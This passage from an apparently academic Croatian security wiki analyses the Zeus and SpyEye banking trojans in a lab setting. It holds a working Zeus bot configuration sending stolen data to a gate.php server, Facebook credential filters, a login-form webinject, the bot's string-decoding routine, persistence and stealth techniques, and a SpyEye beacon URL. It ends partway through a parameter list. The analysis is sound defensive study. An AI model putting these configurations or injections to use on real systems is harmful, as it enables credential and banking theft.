</p><p>Dio koji će biti zanimljiv napadačima je upravljanje bot-ovima tj. cjelim botnet-om, a to se najćešče provodi kroz skripte koje se pišu te se šalju bot-ovma kako bi ih oni izvršavali. Ovo je vrlo jednostavan i efikasan sustav distribucije naredbi te ga je vrlo lako shvatiti. Ono što je bitno je da bot-ovi koji šalju zahtjeve prema serveru dohvate skriptu te je nakon toga pokušavaju izvršiti na zaraženom računalu. Način na koji se pišu skripte je isto tako vrlo zanimljiv te ne zahtjeva programerske vještine nekih velikih razmjera, štoviše uz toolkit dolaze upute o naredbama koje je moguće postaviti u skriptu i kako se one koriste. 
</p>
<ul><li>	os_shutdown -  gašenje računala nakon što se izvrši skripta bez obzira na položaj u skripti
</li><li>	os_reboot - restart računala nakon što se izvrši skripta bez obzira na položaj u skripti
</li><li>	bot_uninstall - micanje bota s računala nakon što se izvrši skripta bez obzira na položaj u skripti
</li><li>	bot_update [url] - ažuriraj konfiguracijski file
</li><li>	user_execute [path] [parameters] - pokretanje procesa korištenjem prava trenutnog korisnika, primjer ovakvog izvršavanje je&#160;: user_execute "%ProgramFiles%\Windows Media Player\wmplayer.exe" gdje bot pokreće media player.
</li><li>	user_cookies_get - uzima cookie svih poznatih browser-a
</li></ul>
<p>To su bili neki od primjera naredbi koje se mogu naći kao dio skripte koja se izvršava no postoji mnogo varijacija pošto postoji velik broj parametara koje primaju ove naredbe. 
Kako bi napadač mogao pratiti velik broj podataka koji se stvara radom botnet-a napravljen je sustav pretraživanja baze podataka koji na jednostavan način napadaću omogućava precizno pronalaženje traženog skupa podataka. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_3_botnet.png" class="image"><img alt="S 3 botnet.png" src="../../images/1/1f/S_3_botnet.png" width="452" height="231" /></a>
</p><p>Sva izvješća koja su dostavljan mogu se spremati i u lokalni file iz kojeg se mogu pretraživati podatci. Dodatno kontrolni panel ima još nekoliko opcije koje se tiču šturih postavki sučelja i informacija o sustavu na kojem je postavljen kontrolni panel. Za pristup samom panelu mogu se kreirati dodatni korisnici kojima je moguće dodjeljivat neka osnovna prava te se na taj način kreira sustav uloga u sustavu. Upravljanje korisnicima pokazuje kako se radi o sustavu s više razina ovlasti i da je predviđen za korištenje od strane više napadača
</p>
<h4> <span class="mw-headline" id="Zeus_Config">Zeus Config</span></h4>
<p>Config je osnovna datoteka koja je bot-u potrebna kako bi dobio zadatke koje mora raditi na zaraženom računalu. To je prva datoteka koju bot pokušava dohvatiti jednom kad se instalira na računalo. Unutar Config datoteke u običnom tekstu definiramo statički i dinamički dio. Statički dio možemo nazvati i operativni dio bot-a jer sadržava osnovnu funkcionalnost koju bot mora raditi jednom kad se instalira na računalo. Prije svega bot mora uspostaviti komunikaciju s komandnim centrom kako bi primio config file koji sadrži osnovne postavke i upute za izvršavanje na zaraženom računalu. Osnovne postavke za naš bot su&#160;:
</p>
<pre>entry "StaticConfig"
&#160;;botnet "bnet1" 
 timer_config 60 1
 timer_logs 1 1
 timer_stats 20 1
 url_config "<a href="http://192.168.1.50/ZeuS" class="external free" rel="nofollow">http://192.168.1.50/ZeuS</a> 2.0.8.9/output/builder/config.bin"
 encryption_key "lozinka"
end
</pre>
<p>prvo definiramo pripadajući botnet za navedenog bota zatim vrijeme osvježavanja tj. koliko često bot traži konfiguracijsku datoteku, timer_logs predstalja vrijeme između slanja izvještaja tj. podataka prikupljenih na računalu, timer_stats je pak razmak između slanja statistika za zaraženo računalo. url_config predstavlja adresu s koje bot skida konfiguracijske datoteke za potrebe primjera usmjerili smo bot-a na server u drugom virtualnom stroju kako bi s njega dohvatio config.bin. Lozinka koja je nakraju predstavlja lozinku za enkripciju config datoteke i same komunikacije bot-a tako da je vrlo važno poznavanje lozinke.
Dinamički dio konfiguracije vrlo je varijabilan te se nećemo upuštati u detalje oko njegovih mogućnosti i varijanti izvedbe već ćemo objasniti o čemu se radi u našoj konfiguraciji.
</p>
<pre>entry "DynamicConfig"
 url_loader "http:// 192.168.1.50/ZeuS 2.0.8.9/output/builder/bot.exe"
 url_server "http:// 192.168.1.50/ZeuS 2.0.8.9/output/server[php]/gate.php"
 file_webinjects "webinjects.txt"
 entry "WebFilters"
   "!*.microsoft.com/*"
   "!<a href="http://*myspace.com*" class="external free" rel="nofollow">http://*myspace.com*</a>"
   "@*google.com/*"
   "http:elf.doi.hr /*"
 end
 entry "WebDataFilters"
  &#160;;"<a href="http://www.facebook.com/*" class="external free" rel="nofollow">http://www.facebook.com/*</a>" "email;pass"
 end
 entry "WebFakes"
  &#160;;"<a href="http://www.yahoo.com" class="external free" rel="nofollow">http://www.yahoo.com</a>" "<a href="http://www.google.com" class="external free" rel="nofollow">http://www.google.com</a>" "GP" "" ""
 end
end
</pre>
<p>Za poćetak imamo dva url-a koji označavaju otkud se dohvaća zadnja verzija bot-a i kuda bot mora slati podatke koje je skupio s zaraženog računala, gate.php dakle služi kao ulaz pomoću kojeg se podatci spremaju na server. Zatim slijedi datoteka koja su nalazi uz config datoteku a sadrži osnovne postavke za umetanje koda u web stranice prilikom njihovog učitavanja, kasnije ćemo malo detaljnije o tome. Web filteri su važan dio bot-a jer osiguravaju da se prikupljaju podatci vezani uz određene stranice i na taj način smanji količinu podataka koju bot prikuplja. Mi smo definirali da se ne prikupljaju podatci vezani uz microsoft i myspace te da se rade screenshotovi za google te da se prati elf.foi.hr. WebDataFilteri prikupljaju podatke koji se vežu za oznaku pojedinog taga unutar strukture stranice, tako u slučaju facebook-a tražimo tag-ove koji su označeni sa email i pass kako bi smo prikupili podatke za prijavu korisnika. Ovakav pristup također pogoduje napadaču jer dobiva točno definirani skup podataka. WebFakes je definiranje preusmjeravanja korisnika u slučaju da pristupi nekoj stranici, tako u našem slučaju preusmjeravamo korisnike s yahoo-a na google što je pogodno jer ionako pratimo akcije koje se događaju na google-u.
Postoje još neke mogućnosti koje nismo navodili a vežu se uz još neke vrste krađe podataka. TAN graber je jedna od ugrađenih mogućnosti koji definira s kojih stranica i kako uzimati TAN podatke koji su upisani u formu. Poslana forma se prati i iz nje se izvlače podatci koje je upisao korisnik, tako ova vrsta krađe može postati vrlo profitabilna ako napadač već posjeduje neke podatke o korisniku. 
Jedan od oblika napada je i webinject koji je dobro podržan 
</p>
<pre>set_url */facebook.com /* GP
data_before
&lt;td&gt;
   &lt;input type="password" class="inputtext" name="pass" id="pass" tabindex="2"&gt;
 &lt;/td&gt;
data_end
data_inject
&lt;td&gt;
   &lt;input type="text" class="inputtext" name="boja" id="boja"&gt;
 &lt;/td&gt;
data_end
data_after
&lt;td&gt;
   &lt;label class="uiButton uiButtonConfirm" for=
data_end
</pre>
<h4> <span class="mw-headline" id="Upravljanje_zara.C5.BEenim_ra.C4.8Dunalom">Upravljanje zaraženim računalom</span></h4>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_2_botnet.png" class="image"><img alt="S 2 botnet.png" src="../../images/5/55/S_2_botnet.png" width="574" height="334" /></a> 
</p>
<pre>&lt;form class="loginform" id="login" method="post" action= "<a href="https://elf.foi.hr/login/index.php" class="external free" rel="nofollow">https://elf.foi.hr/login/index.php</a>"&gt;
</pre>
 <div class="c1 fld username">
 <div class="c1 fld password">
 <div class="c1 fld username">
<pre>  &lt;label for="boja"&gt;Omiljena boja&lt;/label&gt;
  &lt;input type="text" name="boja" id="boja" value=""/&gt;
</pre>
 </div>
 <div class="c1 btn">
<pre>&lt;/form&gt;
</pre>
<p><br /> 
<a href="http://security.foi.hr/wiki/index.php/Datoteka:S_1_botnet.png" class="image"><img alt="S 1 botnet.png" src="../../images/3/30/S_1_botnet.png" width="668" height="188" /></a>
</p>
<pre>&lt;tr&gt;&lt;td&gt;
   &lt;input type="text" class="inputtext" name="email" id="email" value="" tabindex="1"&gt;
 &lt;/td&gt; &lt;td&gt;
   &lt;input type="password" class="inputtext" name="pass" id="pass" tabindex="2"&gt;
 &lt;/td&gt;&lt;td&gt;
   &lt;input type="text" class="inputtext" name="boja" id="boja"&gt;
 &lt;/td&gt;&lt;td&gt;
   &lt;label class="uiButton uiButtonConfirm" for="uo0uy4_5"&gt;
   &lt;input value="Log In" tabindex="4" type="submit" id="uo0uy4_5"&gt;
   &lt;/label&gt;
 &lt;/td&gt;
&lt;/tr&gt;
</pre>
<h3> <span class="mw-headline" id="Analiza_zeus_bota">Analiza zeus bota</span></h3>
<h4> <span class="mw-headline" id="Instalacija_bota_i_source">Instalacija bota i source</span></h4>
<p>Analiza bot-a je provedena na virtualnom računalu kako bi smo mogli pratiti promjene koje su napravljene na sustavu i komunikaciju koju zaraženo računalo pokušava ostvariti. Prije svega virtualnom stroju je dodijeljen statički ip s poveznicom prema drugom virtualnom stroju kako bi se bot mogao pristupiti komandnom centru i skinuti potrebne podatke s njega. Na sustav je postavljen softver za bilježenje registry-a te softver za kreiranje snaphot-a sustava, s ova dva softvera provest ćemo analizu promjena koje su napravljene na sustavu.
Jednom kad smo napravili bot-a prebacili smo ga na računalo koje je trebalo biti zaraženo i pokrenuli ga. Rezultat pokretanja je naravno otpakiravanje i instalacija na sustav. Kako bi smo vidjeli o čemu se točno radi možemo iskoristiti neki od disasemblera koji mogu rastaviti exe datoteke kako bi se moglo doći do njihovog koda i vidjeti što one točno rade. Kako bi smo došli do izvršavanja bot-a koristili smo ollydbg. Dobiveni rezultat je prikazan u asembleru i daje nam sljedeći prikaz.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_21_botnet.png" class="image"><img alt="S 21 botnet.png" src="../../images/3/38/S_21_botnet.png" width="571" height="408" /></a>
</p><p>trenutni dio izvršavanja na kojem je stao sadrži dekodiranje stringova koji su bot-u potrebni za rad. Kod je dosta zamršen tako da se ovdje radi o nekom obliku raspetljavanja, prikazani kod može se prevesti u sljedeći pseudo kod 
</p>
<pre>seed = 0xBA;
String new string = new String(enc_string.length());
for i = 0 do enc string.length(){
  new_string[i] = (enc_string[i] + seed)&#160;%256;
  seed = (seed + 2);
}
vrati (new_string)
</pre>
<p>Nakon otpakiravanja pozivaju se kernel funkcije za ućitavanje biblioteka i pregledavaju se procesi koji se izvršavaju na računalu.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_22_botnet.png" class="image"><img alt="S 22 botnet.png" src="../../images/e/ee/S_22_botnet.png" width="573" height="134" /></a>
</p><p>Bot također po ulasku u računalo iz tablica procesa saznaje nekoliko bitnih informacija, prije svega dali se na računalu nalaze neki od njemu poznatih antivirusnih programa ili firewall-a, tako je poznato da se traže izvršni procesi outpost.exe i zlclient.exe te u slučaju da postoje bot prestaje s instalacijom. Nakon što je obavio preliminarnu pretragu bot pokušava upisati svoju putanju u registry. Razlog tome je omogućavanje pokretanja bot-a po pokretanju operacijskog sustava i korisničkih prava. Kako bi smo vidjeli što je bot napravio napravili smo snimku registry-a prije i nakon pokretanja bot-a, usporedbu i snimanje napravili smo RegShot-om koje nam je omogućio i usporedbu dvije snimke. Iz uspredbe možemo vidjeti da se radi o jednostavnom unosu putanje kopije bot-a koja se nalazi u system32 direktoriju.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_23_botnet.png" class="image"><img alt="S 23 botnet.png" src="../../images/e/e5/S_23_botnet.png" width="497" height="292" /></a> 
</p><p>Nakon toga bot se pokušava ubaciti direktno u virtualnu memoriju procesa winlogon.exe i od tamo kreirati još jednu dretvu pomoću koje će se izvršavati. Na taj način bot po svakom pokretanju ulazi u izvršni dio winlogon procesa i od tamo pokreće korisničku dertvu. Bot prilikom instalacije napravi još nekoliko jednokratnih aktivnosti, tako bot na zaraženo računalo postavlja kopiju samog sebe i to system32 direktory te obriše izvršnu datoteku koju je korisnik inicijalno pokrenuo. U slučaju da na računalu postoji kopija bot-a trenutno pokrenuta instalacija prebrisati će starog bot-a i kreirati novog, takvo ponašanje je vidljivo i u slučaju kada se radi ažuriranje starog bot-a. U kodu kodu samog bot-a poziva se ntdll.dll datoteka koja nam je dala sugerirati da se koriste neke njene funkcionalnosti, uspostavilo se da bot zapravo uzima neke dijelove tog file te ih kopira na sdra64.exe. Bot je ustvari kopirao MAC (modification,access,creation) vremena koja operacijskom sustavu daju doznanja kada je kreiran file, u ovom slučaju ispada da je sdra64 kreiran kada je instaliran operacijski sustav.  
Za dodatno skrivanje kopije bot-a napravljene su i promjene na vidljivosti bot-a tako on postaje skrivena datoteka sistemskog tipa kako bi se otežalo njegovo pronalaženje kroz vizualnu pretragu.
Kako bi smo pregledali što je bot sve napravio s operacijskim sustavom napravili smo dva snapshota sustava i to neposredno prije i nakon instalacije bot-a. Ispostavilo se da je u sustav nadodano nekoliko stvari, prvo je naravno sama kopija bot-a koja je dodana u system32 no dodan je i jedan direktorij, lowsec. Direktorij koji je napravljen za vrijeme instalacije nije skriven te se  u njemu nalaze dvije datoteke, user.ds i local.ds. Datoteka user.ds ima funkciju spremanja dinamičkog dijela konfiguracije koja dolazi s bot-om te za spremanje uputa koje su proslijeđene od strane komandnog centra. Datoteka local.ds služi za spremanje podataka vezanih u zaraženo računalo i naravno svih ukradenih podataka koji su spremni za slanje, možemo reći da se radi o privremenoj memoriji koju bot koristi kako bi mogao čuvati podatke između definiranih intervala slanja podataka.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_24_botnet.png" class="image"><img alt="S 24 botnet.png" src="../../images/6/66/S_24_botnet.png" width="242" height="145" /></a>
</p><p>Pošto je ovo starija verzija bot-a koju smo koristili iz razloga jer ju je nešto lakše kontrolirati i nadzirati postoje novije varijante koje imaju određen napredak i naravno razlikuju se od navedene. Iz tih razloga svaki bot ima različite načine predstavljanja i može kreirati različite direktorije s različitim datotekama što čini posao pronalaženja nešto težim. 
</p>
<h4> <span class="mw-headline" id="Komunikacija">Komunikacija</span></h4>
<p>Ono što bot-u definitivno treba je komunikacija sa komandnim serverom te je bitno pogledati i taj aspekt. Bot komunikaciju s vanjskim svijetom vrši slanjem i primanjem kriptiranih poruka koje su prema nekim kriptirane RC4 algoritmom s ključem koji je naveden u statičkom dijelu konfiguracije bot-a. Pošto neke analize navode kako se može pronaći statički dio konfiguracije unutar samog bot-a, korištenjem poznatih dijelova moguće je odrediti kljuć koji se nalazi u tome dijelu te se isti može koristiti kako bi se pratila komunikacija unutar navedenog botnet-a.
Komunikacija koja se vrši između botova i kontrolnog centra može se dekodirati korištenjem python skripte i poznavanjem ključa koji se koristi a struktura poruka koje se šalju izgleda ovako&#160;:
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_25_botnet.png" class="image"><img alt="S 25 botnet.png" src="../../images/d/d8/S_25_botnet.png" width="489" height="267" /></a>
</p><p>Poruka se sastoji od zaglavlja s MD5 hash-om koji je napravljen za ostatak podataka koji se šalju u poruci. Isto tako treba napomenuti da se komunikacija može napasti zbog učestale upotrebe istog keystream-a i ne postoji reinicijalizacija sesije prilikom slanja podataka.
Komunikacija se vrši kroz nekoliko koraka, prvi od kojih je javljanje komandnom centru i zahtjev za config.bin datotekom nakon čega slijedi nastavak komunikacije s gate.php skriptom koja se brine zaprimanje podataka od bot-a. Komunikaciju smo pratili korištenjem wireshark-a.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_26_botnet.png" class="image"><img alt="S 26 botnet.png" src="../../images/6/6b/S_26_botnet.png" width="360" height="352" /></a>
</p><p>Iz prikazane slike se može vidjeti da bot šalje get zahtjev prema serveru te mu server odgovara s HTTP OK te mu daje datoteku koju je tražio nakon toga kreće slanje podataka prema gate.php-u i njegov odgovor. Ono što se ovdje ne vidi je ćinjenica da bot prikuplja podatke s raćunala na  kojem je te zahtjev prema nekom poslužitelju kako bi dobio svoju ip adresu natrag. Takav pristup omogućuje bot-u da utvrdi koliko je blizu izlazu na Internet, dali je u NAT-u te u gdje se nalazi. cjelokupna komunikacija između bot-a i kontrolnog raćunala izgleda ovako&#160;:
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:S_27_botnet.png" class="image"><img alt="S 27 botnet.png" src="../../images/0/09/S_27_botnet.png" width="609" height="228" /></a>
</p><p>Ova komunikacija ponavlja se u intervalima koji su definirani u statičkom dijelu konfiguracije te se omogućava nesmetano upravljanje i dobivanje informacija. Kako se komunikacija temelji na http-u lako se uklapa u veliku količinu podataka koje se šalju prema i od računala te ne zahtjeva oslobađanje nekih dodatnih resursa.
</p>
<h3> <span class="mw-headline" id="Zaklju.C4.8Dak_o_zeusu">Zaključak o zeusu</span></h3>
<p>Kada se govori o malware-u tada je zeus u jednom ili drugom obliku jedan od najrasprostranjeniji malware na tržištu. Sa svojim bot-om i kontrolnim centrom govorimo o vrlo jednostavnom ali i vrlo softiciranom obliku malware-a, iako je izvorni kod velike većine dostupan javnosti i dalje se radi o vrlo opasnom obliku malware-a. Antivirusne kuće danas uspijevaju prepoznati nešto više od 50% zeus-ovih bot-ova no uz malo truda ovi se bot-ovi mogu zapakirati u gotovo neprepoznatljive napadače. Korištenjem alata kao što su SAW i God Of War zeus i danas bez puno muke može napraviti poveći botnet. S druge strane napadaču se pruža analitički i komandni centar kojeg se mogu posramiti neka poduzeća, te napadač odavde može izvoditi većinu svojih napada i prikupljati i analizirati sve podatke koji su došli od strane bot-ova.
</p><p><br />
--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Branko.rendulic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Branko.rendulic (stranica ne postoji)">Branko.rendulic</a> 20:23, 2. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="SpyEye">SpyEye</span></h2>
<h3> <span class="mw-headline" id="Op.C4.87enito_o_SpyEye">Općenito o SpyEye</span></h3>
<p>SpyEye je alat pomoću kojeg se može uspostaviti kontrola nad većim brojem računala. Prva verzija SpyEye trojanca je objavljena u prosincu 2009., od strane „black-hat“ programera iz Rusije koji se predstavlja pod pseudonimima „Harderman“ i „Gribodemon“. Od tada je izdano više SpyEye verzija u koje su često dodavane unikatne mogućnosti koje dotad nisu korištene niti u jednom trojanskom konju. Najveći uzlet doživio je u 2010. kada je postao dostojan konkurent Zeus trojancu u pogledu mogućnosti, ali i niže cijene. Osim toga u jednoj od verzija uvedena je mogućnost „Kill Zeus“ koja uklanja Zeus trojanskog konja s računala koje je zaraženo s oba trojanska konja.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_1.png" class="image"><img alt="SpyEye 1.png" src="../../images/6/60/SpyEye_1.png" width="514" height="103" /></a>
</p><p><br />
Općenito SpyEye je „komad“ malicioznog softvera (inačica trojanskog konja) kojim se nastoji neovlašteno prebaciti novac s tuđih Internet bankovnih računa. Cilj alata je uspostaviti mrežu tzv. „zombi“ računala kojom napadač upravlja preko SpyEye upravljačke ploče (engl. Command and Control – C&amp;C). Alat se koristi za obavljanje različitih kriminalnih radnji koje uključuju krađu osobnih i privatnih podataka (npr. brojevi bankovnih računa i kreditnih kartica, podaci za pristup datotekama koje je korisnik spremio na FTP server i dr.) te izradu i pohranu statistike temeljene na analizi tih podataka koja se kasnije koristi u komercijalne svrhe (npr. oglašavanje).
</p><p><br />
<a href="http://security.foi.hr/wiki/index.php/Datoteka:SpEye_2.png" class="image"><img alt="SpEye 2.png" src="../../images/9/9d/SpEye_2.png" width="473" height="240" /></a>
</p><p><br />
Prema podacima iz druge polovice 2011. SpyEye je modificiran s namjerom zaobilaska naprednih zaštitnih sustava koji se koriste u Internet bankarstvu. Takvi sustavi  prate i analiziraju interakciju korisnika sa sustavom. Primjerice, mjere vrijeme koliko je korisnik proveo na nekoj od web stranica sustava za internet bankarstvo, koje stranice korisnik koristi na njihovom poslužitelju, koliko mu je vremena trebalo za izvršavanje transakcije, s kojih IP adresa koristi uslugu itd.. Primjerice, ako osoba redovito pristupa svom bankarskom računu s jednog mjesta (npr. grad u kojem živi) i odjednom promjeni lokaciju i pokuša pristupiti računu potrebno je poduzeti dodatne mjere za provjeru identiteta te osobe. Ujedno to je signal za mogući pokušaj prijevare. Pomoću prikupljenih korisničkih podataka na zaraženim računalima SpyEye se povezuje na bankarski poslužitelj i izvodi transakcije na štetu korisnika i korist vlasnika botneta. Za razliku od korisnika, SpyEye transakciju izvodi automatski i to u puno kraćem vremenu. Zadatak naprednih sustava zaštite je registracija takvog ponašanja i blokiranje daljnjeg izvršavanja bankarske transakcije. Korisnik obično posjećuje nekoliko stranica pri korištenju usluga Internet bankarstva, što nije karakteristično za SpyEye i tako može poslužiti kao indikator moguće prijevare. Najnovije modifikacije SpyEye alata omogućile su emuliranje, odnosno oponašanje navika i načina na koje se korisnici koriste Internet bankarskim uslugama. Može se reći kako SpyEye oponaša uzorke ljudskog ponašanja. Tako SpyEye sada znatno sporije obavlja financijske transakcije. Osim toga kako bi se prikrio ne koristi samo stranice namijenjene obavljanju transakcija. 
</p><p><br />
</p><p>Prema izjavi Romana Hüssya koji je voditelj sjedišta za skupljanje informacija o SpyEyeu (SpyEye Tracker), alat se klasificira kao botnet koji se koristi mrežom od 46 upravljačkih poslužitelja čiji se broj sve više povećava. Primijećeno je također da se u posljednje vrijeme povećao broj banaka čijim je uslugama Internet bankarstva SpyEye prilagođen. 
U kolovozu 2011. Sean Bodmer iz tvrtke za sigurnosna rješenja Damballa je objavio na svom blogu kako je probijena zaštita SpyEyea. Zaštita je omogućavala autoru alata prodaju i održavanje alata svojim klijentima, pri čemu se svaka instalacija SpyEyea vezala uz određeni hardver. Korištenjem reverznog inženjeringa istraživač Xyliton iz grupe RED (Reverse Engineers Dream) Crew je probio VMProtect zaštitu programskog koda SpyEye builder programa i postupak objavio na raznim hakerskim forumima. Cijena SpyEye alata na tržištu doseže vrijednost od oko 10 000 dolara. Probijanjem zaštite, alat je postao dostupan besplatno širem krugu zlonamjernih korisnika. Zbog toga će ubuduće biti teže ući u trag pokretačima SpyEye botnet mreža, koje se više ne povezuju samo s kupcima alata. Uz lažne antivirusne programe i TDL rootkitove SpyEye predstavlja jednu od najvećih sigurnosnih prijetnji, koja je objavom postupka probijanja njegove zaštite sada postala znatno većom i ozbiljnijom.
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Zna.C4.8Dajke_SpyEye_alata">Značajke SpyEye alata</span></h3>
<p>SpyEye je trojanski konj koji ima mogućnost injekcije koda u procese koji su pokrenuti na računalu. Može izvoditi sljedeće funkcije [AVIRA]:
</p>
<ul><li>pratiti mrežni promet
</li><li>pratiti znakove unesene preko tipkovnice
</li><li>slati i primati mrežne pakete kako bi zaobišao aplikacijske vatrozide (eng. firewalls)
</li><li>sakriti i onemogućiti pristup ključevima registra za unos vrijednosti koje se koriste kod pokretanja sustava
</li><li>sakriti i onemogućiti pristup vlastitom kodu
</li><li>sakriti vlastiti proces unutar drugog  procesa
</li><li>ukrasti informacije iz Internet Explorer i Mozilla Firefox preglednika
</li><li>geografski locirati zombi računala preko njihovih IP adresa
</li><li>obrisati konkurentni Zeus trojanski konj, ako se oba nalaze na istom računalu
</li></ul>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_3.png" class="image"><img alt="SpyEye 3.png" src="../../images/8/80/SpyEye_3.png" width="609" height="468" /></a>
</p><p><br />
Neki od konkretnih modula i dodataka te mogućnosti koje su implementirane u SpyEye su:
</p>
<ul><li>program za prevođenje izvornih datoteka alata u izvršne (eng. EXE builder)
</li><li>program za učitavanje izvornih datoteka (eng. EXE loader) kojem je namjena preuzimanje i izvršavanje datoteka na udaljenom žrtvinom računalu
</li><li>web upravljačka ploča (eng. Web control panel) pomoću koje haker nadzire i kontrolira sva zaražena računala u botnet mreži
</li><li>CC Autofill modul za automatizaciju procesa krađe novca s ukradene kartice korisnika čije je računalo zaraženo pomoću IP lociranja
</li><li>sakupljač podataka iz formi (eng. Formgrabber) ima uključeni alat za praćenje unosa preko tipkovnice (eng. keylogger) kojim se kradu određeni podaci koje korisnik unosi u  web formular (npr. brojevi bankovnih računa i detalji kreditnih kartica) na legitimnim stranicama
</li><li>zabrana URL adresa korištenjem regularnih izraza preko upravljačke ploče
</li><li>konfiguracijske datoteke alata su kriptirane radi skrivanja načina na koji program radi
</li><li>krađa FTP (podaci za pristup podatkovnim serverima) i POP3 računa (podaci za pristup e-mail računu korisnika koji se koristi tim protokolom)
</li><li>krađa osnovne autorizacije (eng. Basic Authorization)
</li><li>špijun Zeusa – koristi se za pronalazak upravljačke ploče Zeus botova
</li><li>ubojica Zeusa – koristi se za uklanjanje Zeusa s računala ukoliko se oba nalaze na njemu
</li><li>SpyEye sakupljač (eng. SpyEye Collector) koji koristi LZO kompresiju bez gubitaka podataka. SpyEye Collector osluškuje na portu poslužitelja za pojavom podataka koje potom slijedno pohranjuje u MySQL bazu podatak. 
</li><li>spajanje botova na upravljačku ploču određuje se vremenskim intervalima u kojima istovremeno na upravljačku ploču može biti spojen samo jedan bot
</li><li>slanje rezervne kopije baze podataka od strane botova na e-mail adresu vlasnika svaki dan
</li><li>statistički prikaz podataka o bot računalima i loaderu
</li></ul>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_4.png" class="image"><img alt="SpyEye 4.png" src="../../images/c/c9/SpyEye_4.png" width="609" height="282" /></a>
</p><p>Od pojave SpyEyea na tržištu su se pojavili brojni dodatci koji nadopunjuju i proširuju njegove mogućnosti novima (npr. krađa broja kartice korisnika koji kupuju preko Interneta). Alat je napisan u C++ programskom jeziku, dok su ciljani operacijski sustavi verzije Windowsa od Windows 2000 – Windows 7. U početnim verzijama alat nije bio prepoznat kod većine antivirusnih alata na tržištu, niti se njegov proces mogao vidjeti u upravitelju zadataka, a tako ni u ostalim aplikacijama koje rade u korisničkom modu rada. Razlog tomu je što je alat izrađen na način da radi u ring3 modu tj. da ima najniže ovlasti na računalu. Osim toga trudi se prikriti svoje datoteke i ključeve u registru kod standardnog pretraživanja direktorija i registra. [LSS]
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:SpyEye_5.png" class="image"><img alt="SpyEye 5.png" src="../../images/f/f2/SpyEye_5.png" width="609" height="558" /></a>
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Na.C4.8Din_rada">Način rada</span></h3>
<p>Neki od glavnih znakova koji bi mogli uputiti na moguću infekciju računala korisnika trojanskim konjem poput SpyEyea uključuju usporavanje računala, iskakanje tzv. „pop-ups“ prozora, rušenje ili gašenje računala bez izričite naredbe korisnika za tom akcijom. SpyEye na računalo može dospjeti na više načina:
</p>
<ul><li>kao e-mail prilog (eng. Attachment)
</li><li>kao dio „piratskih“ programskih aplikacija
</li><li>iskorištavanjem sigurnosnih propusta u web pregledniku
</li><li>  …
</li></ul>
<p><br />
Kada dospije na žrtvino računalo samostalno se pokreće i obavlja svoje zadatke bez znanja i dopuštenja vlasnika odnosno korisnika računala.
</p><p>Datoteke koje se kreiraju kod instaliranja SypeEye alata:
</p>
<pre>c:\cleansweep.exe\cleansweep.exe -&gt; aplikacija
c:\cleansweep.exe\config.bin -&gt; kriptirana konfiguracijska datoteka
%TempFolder%\upd1.tmp
</pre>
<p><br />
Između zaraženog računala (bota) i upravljačke ploče kojom se koristi napadač se razmjenjuju različite poruke. Još više poruka može se dobiti proširivanjem alata raznim dodacima.  Računalo zaraženo SpyEye trojanskim konjem nakon pokretanja automatski šalje poruku serveru na kojem se nalazi upravljačka ploča napadača. Prva u nizu poruka sadrži osnovne podatke o bot računalu i verziji aplikacije.
</p><p>Primjer prve poruke koja se razmjenjuje između bot računala i upravljačke ploče na udaljenom serveru:
</p>
<pre><a href="http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;ie=6.0.2900.2180&amp;os=5.1.2600&amp;ut=Admin&amp;cpu=100&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870" class="external free" rel="nofollow">http://(server)/gate.php?guid=uname!cname!1A2B3C4D&amp;ver=10260&amp;stat=ONLINE&amp;ie=6.0.2900.2180&amp;os=5.1.2600&amp;ut=Admin&amp;cpu=100&amp;ccrc=90A01B2D&amp;md5=0516cb89185fee8bee81a15d2859c870</a>
</pre>
<p>Značenje parametara poruke [LSS]:
</p>
<ul><li><b>guid</b> = &lt;uname&gt;!&lt;cname&gt;!&lt;1A2B3C4D&gt;
<ul><li>Jedinstveni identifikator bot računala koji se sastoji od imena korisnika, imena računala i identifikacijskog broja.
</li></ul>
</li><li><b>ver</b> = 10260
<ul><li>Inačica aplikacije na zaraženom računalu. Najpopularnije inačice su: 10070, 10280 i 10299.
</li></ul>
</li><li><b>stat</b> = ONLINE
<ul><li>Status bot računala. Ako računalo nije upaljeno, poruka se neće slati tako da nema potrebe za „OFFLINE“ statusom. Ako je program za učitavanje izvornih datoteka postavio neku datoteku na bot računalo, status će bit „LOADCOMPLETE“ ili „LOAD-ERROR“, ovisno o rezultatu operacije.
</li></ul>
</li><li><b>ie</b> = 6.0.2900.2180
<ul><li>Inačica Internet Explorer preglednika na zaraženom računalu.
</li></ul>
</li><li><b>os</b> = 5.1.2600
<ul><li>Inačica operacijskog sustava Windows na zaraženom računalu.
</li></ul>
</li><li><b>ut</b> = Admin
<ul><li>uloga ili tip korisnika na zaraženom računalu (eng. User Task). Može biti: „Admin“ i „User“.
</li></ul>
</li><li><b>cpu</b> = 100
<ul><li>Postotak iskorištenosti procesora (eng. CPU load).
</li></ul>
</li><li><b>ccrc</b> = 90A01B2D
<ul><li>CRC324 od zadnja 4 bajta config.bin datoteke na računalu. Polje ccrc se koristi kako bi se ustanovilo da li je potrebno ažuriranje konfiguracijske datoteke.
</li></ul>
</li><li><b>md5</b> = 0516cb89185fee8bee81a15d2859c870
